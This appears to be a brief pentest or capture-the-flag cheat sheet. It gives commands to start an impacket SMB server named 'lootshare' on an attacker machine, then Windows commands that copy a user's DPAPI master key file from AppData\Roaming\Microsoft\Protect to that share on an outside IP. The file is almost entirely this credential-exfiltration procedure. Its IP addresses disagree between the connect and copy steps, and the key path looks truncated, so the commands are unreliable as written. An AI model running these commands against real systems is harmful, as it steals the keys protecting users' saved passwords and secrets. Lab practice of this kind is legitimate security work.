
### My machine

```shell

sudo rm -rf /tmp/lootshare
mkdir -p /tmp/lootshare
sudo chown $(whoami):$(whoami) /tmp/lootshare
chmod 777 /tmp/lootshare
ls -ld /tmp/lootshare

sudo /home/slom/.local/bin/smbserver.py share /tmp/lootshare -smb2support -username a -password 'a'

```
or
```sh
mkdir -p share
chmod 777 share

sudo impacket.smbserver share ./share -smb2support -user 'a' -password 'a' 

```

### Target
```powershell

net use * /delete /y

net use \\10.10.16.18\share /user:a a
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-127" \\10.10.16.94\share\masterkey_blob
```
